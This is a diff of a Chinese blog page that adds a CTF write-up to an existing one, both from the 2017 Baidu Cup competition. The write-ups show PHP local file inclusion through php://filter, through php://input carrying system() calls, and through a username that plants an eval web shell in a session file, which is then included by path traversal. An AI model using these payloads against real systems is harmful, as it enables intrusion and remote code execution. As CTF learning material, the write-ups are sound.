@@ -383,7 +383,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    78
+                    156
                 </div>
                 
 
@@ -407,6 +407,10 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h4 id="“百度杯”CTF比赛-2017-二月场-include"><a href="#“百度杯”CTF比赛-2017-二月场-include" class="headerlink" title="“百度杯”CTF比赛 2017 二月场-include"></a>“百度杯”CTF比赛 2017 二月场-include</h4><p>可以使用<br><code>php://filter/convert.base64-encode/resource=index.php</code>读取任意文件但是没啥用，不知道flag文件的名字<br>所以使用<br><code>http://ace46edd1c9f412eb50fa9cd198420223e7b80edf0ee4d9c.changame.ichunqiu.com/?path=php://input</code><br>post<br><code>&lt;?php system(&quot;ls&quot;);?&gt;</code>读取目录<br><code>&lt;?php system(&quot;cat dle345aae.php | base64&quot;);?&gt;</code>读取到flag</p>
+<h4 id="百度杯十二月–看看我的Notebook-session文件包含"><a href="#百度杯十二月–看看我的Notebook-session文件包含" class="headerlink" title="百度杯十二月–看看我的Notebook-session文件包含"></a>百度杯十二月–看看我的Notebook-session文件包含</h4><p><img src="1.png" alt=""><br>之后在robots.txt发现php1nFo.php文件<br><code>http://ceb4e4f921b2444eaeb20d272f7a9cef79afe475f5c7447f.game.ichunqiu.com/action.php?module=php&amp;file=php1nFo</code><br>发现<br><img src="2.png" alt=""><br><img src="3.png" alt=""><br>poc<br>注册用户</p>
+<pre><code>&lt;?php @eval($_POST[cmd]);?&gt;</code></pre><p>登录然后查看自己的session</p>
+<pre><code>PHPSESSID:e12gf61f8dqd0vfpg4ssntdpc7</code></pre><p>然后访问</p>
+<pre><code>http://cd674daadfa14fda832ca1e08c3ad0853810ea5951d34a15.changame.ichunqiu.com/action.php?module=txt&amp;file=../../../tmp/SESS/sess_e12gf61f8dqd0vfpg4ssntdpc7</code></pre><p><img src="4.png" alt=""></p>
 
             </div>
             <hr/>
@@ -754,7 +758,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">148.9k</span>&nbsp;字
+                class="white-color">148.8k</span>&nbsp;字
             
             
             
